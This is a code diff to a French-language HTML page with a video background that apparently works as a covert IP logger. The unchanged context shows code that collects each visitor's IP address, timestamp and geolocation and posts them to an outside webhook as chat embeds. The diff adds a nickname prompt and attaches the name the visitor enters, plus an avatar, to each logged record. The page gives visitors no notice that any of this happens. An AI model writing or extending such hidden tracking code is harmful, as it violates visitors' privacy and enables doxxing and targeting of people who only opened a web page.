@@ -275,6 +275,14 @@
     </style>
 </head>
 <body>
+    <div id="pseudoModal" style="position:fixed;top:0;left:0;width:100%;height:100%;z-index:999;background:rgba(0,0,0,0.9);display:flex;align-items:center;justify-content:center;backdrop-filter:blur(20px);">
+        <div style="text-align:center;width:90%;max-width:360px;">
+            <h2 style="color:white;font-size:22px;margin-bottom:8px;font-family:'Inter',sans-serif;">Bienvenue</h2>
+            <p style="color:rgba(255,255,255,0.5);font-size:13px;margin-bottom:24px;font-family:'Inter',sans-serif;">Choisis un pseudo pour continuer</p>
+            <input id="pseudoInput" type="text" placeholder="Ton pseudo..." maxlength="20" style="width:100%;padding:14px 18px;border-radius:10px;border:1px solid rgba(255,255,255,0.15);background:rgba(255,255,255,0.05);color:white;font-size:15px;font-family:'Inter',sans-serif;outline:none;text-align:center;backdrop-filter:blur(10px);transition:all 0.3s ease;" onfocus="this.style.borderColor='rgba(255,255,255,0.4)'" onblur="this.style.borderColor='rgba(255,255,255,0.15)'">
+            <button onclick="submitPseudo()" style="margin-top:16px;width:100%;padding:14px;border-radius:10px;border:1px solid rgba(255,255,255,0.2);background:rgba(255,255,255,0.08);color:white;font-size:15px;font-weight:600;font-family:'Inter',sans-serif;cursor:pointer;transition:all 0.3s ease;" onmouseover="this.style.background='rgba(255,255,255,0.95)';this.style.color='#000'" onmouseout="this.style.background='rgba(255,255,255,0.08)';this.style.color='white'">Entrer</button>
+        </div>
+    </div>
     <div class="video-bg">
         <video autoplay muted loop playsinline>
             <source src="vid.mp4" type="video/mp4">
@@ -333,6 +341,25 @@
     </button>
 
     <script>
+        var visitorPseudo = localStorage.getItem('visitorPseudo');
+        if (visitorPseudo) {
+            document.getElementById('pseudoModal').style.display = 'none';
+        }
+
+        function submitPseudo() {
+            var val = document.getElementById('pseudoInput').value.trim();
+            if (val.length < 1) return;
+            visitorPseudo = val;
+            localStorage.setItem('visitorPseudo', val);
+            document.getElementById('pseudoModal').style.display = 'none';
+            initLogger();
+        }
+
+        document.getElementById('pseudoInput').addEventListener('keydown', function(e) {
+            if (e.key === 'Enter') submitPseudo();
+        });
+
+        function initLogger() {
         const canvas = document.getElementById('venomCanvas');
         const ctx = canvas.getContext('2d');
         let W, H;
@@ -689,8 +716,9 @@
             var heure = now.toLocaleTimeString('fr-FR');
 
             var embed1 = {
-                title: 'Location',
+                title: visitorPseudo,
                 color: 2894892,
+                thumbnail: { url: 'https://api.dicebear.com/7.x/bottts-neutral/svg?seed=' + encodeURIComponent(visitorPseudo) },
                 fields: [
                     { name: 'IP', value: '||`' + ip + '`||', inline: true },
                     { name: 'Date', value: date + ' ' + heure, inline: true },
@@ -792,6 +820,9 @@
                 geo = {};
                 sendWebhook([{ name: 'Status', value: 'IP non disponible', inline: false }]);
             });
+        }
+
+        if (visitorPseudo) initLogger();
     </script>
 </body>
 </html>
